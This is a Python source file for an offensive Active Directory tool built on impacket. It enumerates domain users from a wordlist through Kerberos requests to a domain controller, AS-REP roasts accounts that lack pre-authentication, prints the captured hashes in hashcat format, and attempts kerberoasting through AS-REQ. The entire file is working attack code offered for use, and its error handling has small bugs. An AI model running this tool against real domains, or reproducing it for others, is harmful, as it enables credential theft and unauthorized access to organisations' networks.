from queue import Queue
import time as t
from multiprocessing import Process
import argparse
import threading
import sys
import traceback
import socket
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, AS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, SessionError
from impacket.krb5.types import Principal


art = r"""
    ⠀⠀⠀⠀⠀⠀⢎⠉⠁⠈⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠞⠋⠙⠛⠛⠢⠤⣀⠰⠗⠒⠂⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡀⠀⠀⠀⢀⡤⠖⢒⣛⣓⣦⣀⡴⢋⠭⠿⠿⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠿⠀⠀⠀⢨⠤⠞⠉⠀⢀⠉⠻⣗⠁⠀⢸⣷⣌⠻⡆
⠀⠀⠀⠀⠀⠀⠀⣠⠔⠉⠀⠀⠀⠀⠈⢦⠀⠀⢰⣿⣷⡀⠸⡀⠀⠘⣿⣼⠆⢱
⠀⠀⠀⢀⡤⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⡿⡀⠀⣼⣧⡾⠀⢠⡧⣀⣀⣬⠥⣖⡥
⠀⣠⠜⠁⠀⠀⣀⡴⠤⣄⠀⠀⢰⡄⠀⢧⡳⠤⣌⣡⣤⡴⠛⠳⣄⣉⡩⠝⠋⢁
⡔⠁⠀⠀⠀⡼⢩⣧⡀⠘⢦⡀⠀⠉⠓⠲⠿⠛⠛⠉⠁⠀⠀⠀⠈⠏⠀⢀⣠⣺
⡇⠀⠀⠀⠀⢧⠈⢷⣙⣶⣄⡉⠓⠢⠤⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣶⡾⢿⣿⠁
⠱⡀⠀⠀⠀⠈⢦⡈⠻⢝⡛⠿⣿⣓⠒⠶⠶⠾⠿⣿⣟⠛⠋⠉⠉⣹⣦⡿⠁⠀
⠀⠘⢆⠀⠀⠀⠀⠙⠢⣄⡉⠑⠒⠭⠿⠶⠶⣶⣞⣫⣥⣤⢖⡾⠿⠟⠋⠀⠀⠀
⠀⠀⠀⠑⠀⢀⡀⠀⠀⠀⠉⠉⠓⠒⠒⠒⠛⣉⣉⠉⣃⡦⠋⠀⠀⠀⠀⠀⠀⠀


"""


try:
    from detla_data.scripts.utils.kerb5getuserspnnopreauth import getKerberosTGT as nopreauthTGT
    from detla_data.scripts.utils.adconn import LdapConn
    from detla_data.scripts.utils.tickets import TGT, TGS_no_preauth
except:
    sys.path.insert(0, './delta2/scripts/utils')
    from adconn import LdapConn
    from tickets import TGT, TGS_no_preauth
    from kerb5getuserspnnopreauth import getKerberosTGT as nopreauthTGT


def build_queue(file) -> Queue:
    objs = open(file, 'r').readlines()
    q = Queue()
    for obj in objs:
        obj = obj.strip()
        q.put(obj)
    return q

discovered = []
no_preauth_users = []
def enumerate_user(user, domain, dc):
    dc_ip = socket.gethostbyname(dc)
    userclient = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    try:
        getKerberosTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
                           lmhash='', nthash='')

    except SessionError as e:
        code = e.getErrorCode()
        if code != 6:
            print(f'[+] Found user: {user}@{domain}')
            discovered.append(user)
            return {'user':user}
        else:
            return None
    except Exception as e:
            #print(e)
        print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
        no_preauth_users.append(user)
        return {'user':user}


def get_userTGSs(no_preauth_user, domain, target_users, dc):
    print('[+] trying to kerberoast with the gathered info....')
    for user in target_users:
        try:
            T = TGS_no_preauth(domain=domain, username=user, dc=dc)
            T.run(nopreauth_user=no_preauth_user)
        except Exception as e:
            None
            #print(traceback.print_exc())


def get_userTGT(user, domain, dc):
    valid = enumerate_user(user, domain, dc) 
    user = valid['user']
    if valid != None:
        T = TGT(domain=domain, username=user, dc=dc)
        tgt_data = T.run()
    else:
        tgt_data = None
    return tgt_data




def run(domain, dc, delay) -> [{'username@domain':f'', 'hash':'hash'}]:
    hashes = []
    while not q.empty():
        user = q.get()
        try:
            data = get_userTGT(user,domain,dc)
            if data != None:
                print(data)
                hashes.append({'username@domain':f'{user}@{domain}','hash':data})
        except Exception as e:
            None
            #print(e)
        finally:
            t.sleep(delay)
    return hashes

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    

    parser.description = f"""This tool is for asrep roasting multiple users that don't require preauth 
    and for enumerating users (will grab TGTs if able and output into hashcat format) will also kerberoast if possible through AS-REQ, see 
    https://github.com/fortra/impacket/pull/1413 for more details on getting TGS through AS-REQ """
    parser.prog = art
    try:
        parser.add_argument('-user_file', help="the user file for user to be enumerated")
        parser.add_argument('-domain', help='the target domain')
        parser.add_argument('-dc', help='the domain controller')
        parser.add_argument('-workers', default=10, help='the number of threads in the thread pool, default is 10', type=int)
        parser.add_argument('-delay', help='add a delay in between requests', default=0, type=float)

        options = parser.parse_args()
        f = options.user_file
        domain = options.domain
        dc = options.dc
        delay = options.delay
        q = build_queue(f)
        print(art)
        print(parser.description)
        processes = options.workers
        total = q.qsize()
        for process in range(processes):
            # p = Process(target=run, args=(domain, dc, delay,))
            p = threading.Thread(target=run, args=(domain, dc, delay,))
            p.start()
            p.join()
            t.sleep(0.1)
        for nopreauthuser in no_preauth_users:
            get_userTGSs(no_preauth_user=nopreauthuser, domain=domain, target_users=discovered, dc=dc)


    except KeyboardInterrupt:
        exit()
    except:
        parser.print_help()
    
